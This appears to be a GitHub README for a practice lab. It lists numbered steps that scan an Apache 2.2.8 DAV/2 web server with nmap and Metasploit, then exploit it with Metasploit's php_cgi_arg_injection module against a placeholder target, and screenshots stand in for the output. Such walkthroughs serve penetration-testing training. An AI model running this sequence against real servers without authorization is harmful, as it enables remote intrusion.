# Port-80-Apache-httpd-2.2.8-Ubuntu-DAV-2-
1.nmap -sV <target>
![image](https://github.com/thanawut2903/Port-80-Apache-httpd-2.2.8-Ubuntu-DAV-2-/assets/159118913/ed73a494-3aa2-405b-a96c-bf2da1a41fc1)
2.msfconsole
3.msf 6 > search http scanner
![image](https://github.com/thanawut2903/Port-80-Apache-httpd-2.2.8-Ubuntu-DAV-2-/assets/159118913/f6206cc9-5230-439f-a2a2-bd396aa22138)
4.msf 6 > use auxiliary/scanner/http/http_version
5.show optios
6.set rhost <target>
![image](https://github.com/thanawut2903/Port-80-Apache-httpd-2.2.8-Ubuntu-DAV-2-/assets/159118913/14ea3484-821a-4902-9097-a6f897e569b1)
7.searchsloit apache 2.2.8 | grep php
![image](https://github.com/thanawut2903/Port-80-Apache-httpd-2.2.8-Ubuntu-DAV-2-/assets/159118913/872acefe-0a3d-410a-b24e-ea703d38ae84)
8.msf 6 > search apache 2.2.8
9.msf 6 > exploit/multi/http/php_cgi_arg_injection
![image](https://github.com/thanawut2903/Port-80-Apache-httpd-2.2.8-Ubuntu-DAV-2-/assets/159118913/4ba22dd0-365d-43bc-98dc-8beed3cfbd52)
10.msf 6 > set RHOST <traget>
11.msf 6 > exploit
![image](https://github.com/thanawut2903/Port-80-Apache-httpd-2.2.8-Ubuntu-DAV-2-/assets/159118913/f5196182-44d1-49eb-9ae9-ffd840adb73c)
